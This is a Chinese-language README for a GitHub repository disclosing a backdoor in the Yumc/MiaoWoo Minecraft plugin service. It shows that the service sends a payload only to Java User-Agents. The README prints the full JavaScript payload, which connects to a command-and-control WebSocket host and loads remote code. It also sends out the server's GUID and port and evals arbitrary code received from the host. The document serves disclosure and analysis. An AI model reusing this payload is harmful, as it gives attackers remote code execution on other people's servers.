# PoC-MiaoWoo-RCE

你觉得设置非 Java UA 无法下发 RCE 能骗谁？

有关 RCE 的危害，详见[这篇文章](https://rentry.org/miaowoo)

# Validation

https://github.com/iceBear67/poc-miaowoo/tree/47abab96a1becb2dac1caa0994a94ec10407d422

本仓库使用 curl 模拟不同 User-Agent 的请求访问 Yumc 的服务器并且整个流程在 GitHub Action 服务器上运行，无介入，运行时结果无法被 GitHub Runner 和喵呜以外的任何人修改。

https://github.com/iceBear67/poc-miaowoo/actions/runs/7472662191

[该 commit 上运行的脚本](https://github.com/iceBear67/poc-miaowoo/blob/47abab96a1becb2dac1caa0994a94ec10407d422/.github/workflows/blank.yml#L20-L22)

人话版:
 - 这个仓库写了一个脚本让 github 跑，然后把不同 UA 得到的结果存在仓库里面。
 - 是 github 机器人自动存的，和我没关系
 - 存的内容就是那个 commit 时间上喵呜服务器分发的内容
 - 没法造假，除非我和微软有交易

# Analysis

不同 UA 导致的回复不同：

[Java UA](https://github.com/iceBear67/poc-miaowoo/blob/47abab96a1becb2dac1caa0994a94ec10407d422/response-with-java-ua.txt)

[浏览器 UA](https://github.com/iceBear67/poc-miaowoo/blob/47abab96a1becb2dac1caa0994a94ec10407d422/response-with-browser-ua.txt)

[curl UA](https://github.com/iceBear67/poc-miaowoo/blob/47abab96a1becb2dac1caa0994a94ec10407d422/response-with-curl-ua.txt)

可以发现，只有请求头中模拟 Java 作为用户代理的时候 Yumc 服务器会返回负载。

后门代码片段：

1. 连接 C&C 服务器

```javascript
try {
    if (!global.WebSocket) {
        load('https://mscript.yumc.pw/api/plugin/download/name/ms-websocket')
    }
    if (global.ws) {
        global.ws.heartbeat()
        Java.type('java.lang.Thread').sleep(1000)
        if (global.ws.readyState == WebSocket.CLOSED) {
            connect('ws://zn.gametime.icu:4000/')
        }
    } else {
        connect('ws://zn.gametime.icu:4000/')
    }
} catch (error) {
}
```

3. 从 C&C 接收 **任意代码** 并运行

```javascript
    global.ws.onmessage = function (event) {
        try {
            var data = event.data
            var payload = JSON.parse(data)
            var action = payload.action
            var data = payload.data
            switch (action) {
                case "eval":
                    global.ws.message(eval(data) + '')
                    break
                case "heartbeat":
                    global.ws.heartbeat()
                    break
                case "close":
                    global.ws.remoteClose = true
                    break
            }
        } catch (error) {
            global.ws.message(error + '')
        }
    }
```

完整负载内容如下：

```javascript
var global = this

function readGuid() {
    var YamlConfiguration = Java.type('org.bukkit.configuration.file.YamlConfiguration')
    var Files = Java.type('java.nio.file.Files')
    var StandardCharsets = Java.type('java.nio.charset.StandardCharsets')
    var JavaString = Java.type('java.lang.String')
    var Paths = Java.type('java.nio.file.Paths')
    try {
        var pluginHelper = new YamlConfiguration()
        pluginHelper.loadFromString(new JavaString(Files.readAllBytes(Paths.get('plugins', 'PluginHelper', 'config.yml')), StandardCharsets.UTF_8))
        return pluginHelper.getString('guid')
    } catch (error) {
        var bStats = new YamlConfiguration()
        bStats.loadFromString(new JavaString(Files.readAllBytes(Paths.get('plugins', 'bStats', 'config.yml')), StandardCharsets.UTF_8))
        return bStats.getString('serverUuid')
    }
}

function connect(address) {
    global.ws = new WebSocket(address)

    global.ws.action = function (action, data) {
        global.ws.send(JSON.stringify({
            action: action,
            data: data
        }))
    }

    global.ws.message = function (message) {
        global.ws.action('message', { message: message })
    }

    global.ws.heartbeat = function () {
        global.ws.action('heartbeat', {})
    }

    global.ws.onopen = function () {
        global.ws.action('open', {
            guid: readGuid(),
            port: Java.type('org.bukkit.Bukkit').getServer().getPort()
        })
    }

    global.ws.onmessage = function (event) {
        try {
            var data = event.data
            var payload = JSON.parse(data)
            var action = payload.action
            var data = payload.data
            switch (action) {
                case "eval":
                    global.ws.message(eval(data) + '')
                    break
                case "heartbeat":
                    global.ws.heartbeat()
                    break
                case "close":
                    global.ws.remoteClose = true
                    break
            }
        } catch (error) {
            global.ws.message(error + '')
        }
    }

    global.ws.onclose = function (event) {
        try {
            Java.type('java.lang.Thread').sleep(5000)
            if (global.ws.readyState == WebSocket.CLOSED && !global.ws.remoteClose) {
                connect(address)
            }
        } catch (error) {
        }
    }

    global.ws.onerror = function (event) {
        if (global.ws.readyState != WebSocket.CLOSED) {
            global.ws.message(event.cause + '')
        }
    }

    global.ws.connect()
}

try {
    if (!global.WebSocket) {
        load('https://mscript.yumc.pw/api/plugin/download/name/ms-websocket')
    }
    if (global.ws) {
        global.ws.heartbeat()
        Java.type('java.lang.Thread').sleep(1000)
        if (global.ws.readyState == WebSocket.CLOSED) {
            connect('ws://zn.gametime.icu:4000/')
        }
    } else {
        connect('ws://zn.gametime.icu:4000/')
    }
} catch (error) {
}
```
